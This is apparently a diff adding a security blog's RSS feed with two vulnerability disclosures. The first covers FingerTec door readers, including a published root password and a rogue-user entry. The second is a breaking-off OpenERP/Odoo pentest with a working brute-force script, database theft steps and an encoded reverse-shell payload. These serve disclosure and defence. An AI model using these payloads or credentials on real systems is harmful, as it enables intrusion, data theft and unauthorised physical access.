+&lt;p&gt;This will create a user named Haxx0r, with id 1337, with a pin number of 12345.  Then you can just walk up to the door and let yourself in.&lt;/p&gt;
+
+&lt;h2 id=&quot;mitigation&quot;&gt;Mitigation&lt;/h2&gt;
+
+&lt;p&gt;Unfortunately, this isn’t going to be patched anytime in the near future.  Obviously, the most effective mitigation is to take these devices completely off the network.  You then lose all of the advantages from having a centrally managed system, though.  In lieu of that, here is what you can do:&lt;/p&gt;
+
+&lt;h3 id=&quot;segregate-the-hell-out-of-these-things&quot;&gt;Segregate the hell out of these things&lt;/h3&gt;
+
+&lt;p&gt;Put them on their own vlan, with no access to the internet, and no access to/from any other vlans, with the exception of the management server.  There really is no good reason these things should be anywhere near the public internet (although a lot of them unfortunately are).&lt;/p&gt;
+
+&lt;h3 id=&quot;change-the-root-telnet-password&quot;&gt;Change the root telnet password&lt;/h3&gt;
+
+&lt;p&gt;Luckily, it is pretty easy to change the root password.  You just set a new root password, then copy the passwd file (no shadow files here) over /mnt/mtdblock and /mnt/mtdblock/data&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# passwd
+Changing password for root
+Enter the new password (minimum of 5, maximum of 8 characters)
+Please use a combination of upper and lower case letters and numbers.
+Enter new password: 
+Re-enter new password: 
+Password changed.
+# cp /etc/passwd /mnt/mtdblock
+# cp /etc/passwd /mnt/mtdblock/data/
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;You will need to change the password back to founder88 in order to do any firmware updates.&lt;/p&gt;
+
+&lt;h2 id=&quot;disclosure-timeline&quot;&gt;Disclosure Timeline&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;10/1/15 - Contacted FingerTec laying out issues and recommendations&lt;/li&gt;
+  &lt;li&gt;10/1/15 - Received response (in 5 hours!) thanking me, and saying that they’d go over it with R&amp;amp;D&lt;/li&gt;
+  &lt;li&gt;12/15/15 - Sent a follow up email, letting them know I’m looking at publishing the results on 1/1/2016&lt;/li&gt;
+  &lt;li&gt;12/15/15 - Received response that due to complexity of firmwares, they won’t be able to address the security concerns for awhile&lt;/li&gt;
+  &lt;li&gt;1/7/16 - Disclosure&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I mulled over quite a bit whether or not to drop the root password.  I decided to drop it because&lt;br /&gt;
+A. Anyone with any level of skill could find it&lt;br /&gt;
+B. There are at least 100 machines open on the internet vulnerable.  That doesn’t include devices behind weak wifi, etc.&lt;br /&gt;
+C. You need the root password in order to secure the device.&lt;/p&gt;
+
+&lt;p&gt;An access control system should never make it easier for a bad guy to get in.  I’m currently working on reversing the protocol that these readers natively speak, and will write up that whole process once I finish.&lt;/p&gt;
+
+</description>
+				<pubDate>Fri, 01 Jan 2016 12:00:00 -0500</pubDate>
+				<link>https://digital-panther.com/2016/01/fingertec-rce</link>
+				<guid isPermaLink="true">https://digital-panther.com/2016/01/fingertec-rce</guid>
+			</item>
+		
+			<item>
+				<title>OpwnERP: Going from Unauthenticated Remote Access to RCE with Odoo ( Formerly OpenERP )</title>
+				<description>&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
+
+&lt;p&gt;I have used OpenERP in my business for the past several years, and have recommended it to several clients. While I’ve had a love/hate relationship with it, the recent versions are really starting to shine. I decided that before I actually host my copy of OpenERP on the open internet, I’d do a penetration test and see if I could break into it.&lt;/p&gt;
+
+&lt;p&gt;My goal was simple: figure out how to break in remotely and get full RCE.&lt;/p&gt;
+
+&lt;p&gt;After a weekend of steady brutalizing, I managed to go from having unauthenticated external access, to&lt;br /&gt;
+getting full control of the databases on a system, to then getting shell access on the server hosting&lt;br /&gt;
+OpenERP. I’ve uncovered a few design weaknesses, some vulnerabilities, and some (I think) clever&lt;br /&gt;
+hackery to put all together and get access. First I’ll list out a play by play of what I found, and how I&lt;br /&gt;
+did it. Then I’ll give a summary of the bugs, and recommended fixes (both for OpenERP and for end&lt;br /&gt;
+users).&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;UPDATE&lt;/em&gt;: This was sent over to Odoo, and they went through and fixed most of the issues.  See the disclosure timeline and information at the end.&lt;/p&gt;
+
+&lt;h2 id=&quot;actual-exploitation&quot;&gt;Actual Exploitation&lt;/h2&gt;
+
+&lt;h3 id=&quot;default-admin-password&quot;&gt;Default Admin Password&lt;/h3&gt;
+
+&lt;p&gt;The first issue is that during a new install, you are presenting with a screen to set up a new database. There is a field for master password, but it is prepopulated.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/CreateDatabase.jpg&quot; alt=&quot;First Screen&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After you fill that out, you are logged into the database.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/LoggedIn.jpg&quot; alt=&quot;Logged In&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The master password gives you access to perform database operations (creating new databases, dropping databases, backing up, and restoring).  You are never asked to change the master password, which by default is ‘admin’, and gives total and complete access to all the databases. If you don’t know better, you think you set the admin password on the initial screen, and never change the password.&lt;/p&gt;
+
+&lt;h3 id=&quot;no-brute-force-detection-on-master-password&quot;&gt;No Brute Force Detection on Master Password&lt;/h3&gt;
+
+&lt;p&gt;The master password is easily the most important credential on the system. With it, you can get full access to all of the customer data.  Suppose whomever configured OpenERP did go back and set a different master password.  How hard would it be to brute force?&lt;/p&gt;
+
+&lt;p&gt;As an example, I tried to drop a database, and intercepted the following POST:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/OpenERPPost1.jpg&quot; alt=&quot;Post in Burp&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now I modified it, and put in a dummy database name.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/OpenERPPost2.jpg&quot; alt=&quot;Post in Burp&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This way, even if I am successful, I won’t actually drop a real database. After submitting it, I get the following result.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/OpenERPPost3.jpg&quot; alt=&quot;Post in Burp&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;That gives us our “bad password” criteria. Here is the result if I submit a fake database with the correct password.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/OpenERPPost4.jpg&quot; alt=&quot;Post in Burp&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;That gives us our “good password” criteria. From here, it is trivial to load up a word list in BurpSuite and brute force the password. To make things even easier (and on the advice of some helpful people in ##security on Freenode), I wrote the following python script to brute force the password using a word list:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;json&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;http://10.110.6.13:8069/web/database/drop&amp;#39;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;Accept&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;application/json, text/javascript, */*; q=0.01&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+      &lt;span class=&quot;s&quot;&gt;&amp;#39;Accept-Encoding&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;gzip, deflate&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+      &lt;span class=&quot;s&quot;&gt;&amp;#39;Referer&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;http://10.110.6.13:8069/web/database/manager&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+      &lt;span class=&quot;s&quot;&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;application/json; charset=UTF-8&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;wordlist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;r&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;attempt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wordlist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;attempt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Attempt number &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%s&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%s&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attempt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()))&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;jsonrpc&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;2.0&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+      &lt;span class=&quot;s&quot;&gt;&amp;#39;method&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;call&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+      &lt;span class=&quot;s&quot;&gt;&amp;#39;params&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;fields&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+          &lt;span class=&quot;p&quot;&gt;[{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;drop_db&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;value&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;InvalidDB&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
+          &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;drop_pwd&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;value&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()}]},&lt;/span&gt;
+      &lt;span class=&quot;s&quot;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;123456789&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;result&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;Password is &amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;This script manages about 50 passwords per second.  While this definitely isn’t the &lt;em&gt;fastest&lt;/em&gt; brute force, there are no slowdowns.  This could probably be modified to run multithreaded and get much higher speeds.  What does this show in OpenERP’s log files?&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;2014-09-08 16:46:07,196 752 INFO None werkzeug: 10.110.6.12 - - [08/Sep/2014 16:46:07] &quot;POST /web/database/drop HTTP/1.1&quot; 200 - 
+2014-09-08 16:46:07,212 752 INFO None werkzeug: 10.110.6.12 - - [08/Sep/2014 16:46:07] &quot;POST /web/database/drop HTTP/1.1&quot; 200 - 
+2014-09-08 16:46:07,229 752 INFO None werkzeug: 10.110.6.12 - - [08/Sep/2014 16:46:07] &quot;POST /web/database/drop HTTP/1.1&quot; 200 -
+2014-09-08 16:46:07,423 752 INFO None werkzeug: 10.110.6.12 - - [08/Sep/2014 16:46:07] &quot;POST /web/database/drop HTTP/1.1&quot; 200 -
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The last line is the successful one, with the fake database name.  In other words, failed login attempts, successful login attempts, and invalid login attempts look exactly the same in the log files.  This would make it very difficult to use something like Fail2ban to automatically block out an attacker.&lt;/p&gt;
+
+&lt;p&gt;So with a weak password, it is only a (short) matter of time before an attacker can gain access to the master password.  A hybrid attack using something like John the Ripper for passwords will take longer, but will still crack many passwords.  The brute forcing itself doesn’t impact OpenERP’s performance on a decent system, so the end users would have no idea they were under attack.&lt;/p&gt;
+
+&lt;h3 id=&quot;downloading-the-databases&quot;&gt;Downloading The Databases&lt;/h3&gt;
+
+&lt;p&gt;Now that we have the master password, we can easily download all of the client data.  This could include personal information, credit card numbers, social security numbers, financials, etc.  It will also give us access into OpenERP itself.&lt;/p&gt;
+
+&lt;p&gt;Here we can go back into the Database Manager, and backup the database.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/OpenERPBackup.jpg&quot; alt=&quot;Backup Screen&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This will give us a PostgreSQL dump that we can import locally, and examine to our heart’s content.  If all an attacker was doing was looking to steal data, they could stop here.  Let’s see how the user table looks.  First, we import it with&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[postgres@localhost ~]$ createdb OpwnedERP 
+[postgres@localhost ~]$ gunzip -c /tmp/TestDatabase_2014-09-08_17-12-00Z.dump | psql -d OpwnedERP 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Next, we’ll connect in and look at the database.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[postgres@localhost ~]$ psql -d OpwnedERP 
+psql (9.3.5) 
+Type &quot;help&quot; for help. 
+
+OpwnedERP=# select login, password from res_users; 
+ login  | password 
+--------+---------- 
+ public | 
+ admin  | s3cure 
+(2 rows) 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Well, that makes things really easy.  By default, the passwords are all stored in plain text.  Using this, we can log in to the database in OpenERP as the admin user.&lt;/p&gt;
+
+&lt;h3 id=&quot;getting-remote-shell-access&quot;&gt;Getting Remote Shell Access&lt;/h3&gt;
+
+&lt;p&gt;Now that we can get into the system using legitimate credentials, we are going to use “Server Actions” to execute python code that will give us the ability to write malicious SQL, upload a PostgreSQL library, upload a simple python reverse shell script, and finally launch it.&lt;/p&gt;
+
+&lt;p&gt;We’ll go into Settings → Users → Administrator&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/OpenERPUsers.jpg&quot; alt=&quot;User Screen&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;You click on Administrator, and click Edit.  Put a checkbox next to Technical Features, save, and refresh.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/OpenERPAdmin.jpg&quot; alt=&quot;Admin Screen&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now the real fun begins.  You go to Settings → Technical → Actions → Server Actions, and click Create.  For the name, put whatever you want, and for Base Model, pick ir.actions.server (this will associate it with this menu, which should go pretty much unnoticed).&lt;/p&gt;
+
+&lt;p&gt;Under Python Code, we’ll enter in the attack code.  We can see that we are very limited in what functionality we can use, so we can’t just insert a one line Meterpreter script.  Everything put in the code snippet will be run with OpenERP’s safe_eval, which blacklists most modules after compiling bytecode.  We are locked down to only using the objects listed.  The database cursor (“cr”) has a function called “execute”, which will let us execute arbitrary SQL commands, though.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/OpenERPServerAction.jpg&quot; alt=&quot;Server Action&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Using this, we use the following code&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;n&quot;&gt;cr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&amp;#39; &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;CREATE TABLE res_support ( bar oid, id SERIAL, name varchar(20), CONSTRAINT id PRIMARY KEY (id) ) WITHOUT OIDS; &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
+&lt;span class=&quot;n&quot;&gt;cr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&amp;#39; &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;create or replace function blob_write(lbytea bytea) &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;   returns oid &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;   volatile &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;   language plpgsql as &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;$f$ &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;   declare &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;      loid oid; &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;      lfd integer; &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;      lsize integer; &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;begin &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;   if(lbytea is null) then &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;      return null; &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;   end if; &lt;/span&gt;
+
+&lt;span class=&quot;s&quot;&gt;   loid := lo_create(0); &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;   lfd := lo_open(loid,131072); &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;   lsize := lowrite(lfd,lbytea); &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;   perform lo_close(lfd); &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;   return loid; &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;end; &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;$f$; &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
+&lt;span class=&quot;n&quot;&gt;cr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&amp;#39; &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;CREATE CAST (bytea AS oid) WITH FUNCTION blob_write(bytea) AS ASSIGNMENT; &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
+
+
+&lt;span class=&quot;n&quot;&gt;cr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&amp;#39; &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;INSERT INTO res_support (bar, name) VALUES (decode(&amp;#39;&amp;lt;60 pages of base64 code&amp;gt;&amp;#39;, &amp;#39;base64&amp;#39;), &amp;#39;pl.so&amp;#39;); &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
+&lt;span class=&quot;n&quot;&gt;cr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&amp;#39; &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;insert into res_support (bar, name) VALUES (decode(&amp;#39;aW1wb3J0IHNvY2tldCwgc3RydWN0CgpzPXNvY2tldC5zb2NrZXQoMiwxKQpzLmNvbm5lY3QoKCcx &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;MC4xMTAuNi4yNycsNDQzKSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMu &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;cmVjdig0MDk2KQp3aGlsZSBsZW4oZCkhPWw6CiAgICBkKz1zLnJlY3YoNDA5NikKZXhlYyhkLHsn &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;cyc6c30pCgo=&amp;#39;,&amp;#39;base64&amp;#39;), &amp;#39;ex.py&amp;#39;); &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
+&lt;span class=&quot;n&quot;&gt;cr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&amp;#39; &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;select lo_export((select bar from res_support where name = &amp;#39;pl.so&amp;#39;), &amp;#39;/tmp/pl.so&amp;#39;); &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
+&lt;span class=&quot;n&quot;&gt;cr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&amp;#39; &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;select lo_export((select bar from res_support where name = &amp;#39;ex.py&amp;#39;), &amp;#39;/tmp/ex.py&amp;#39;); &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
+&lt;span class=&quot;n&quot;&gt;cr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&amp;#39; &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;CREATE OR REPLACE FUNCTION system(cstring) RETURNS integer AS &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;    &amp;#39;/tmp/pl.so&amp;#39;, &amp;#39;system&amp;#39; LANGUAGE &amp;#39;c&amp;#39; STRICT; &lt;/span&gt;
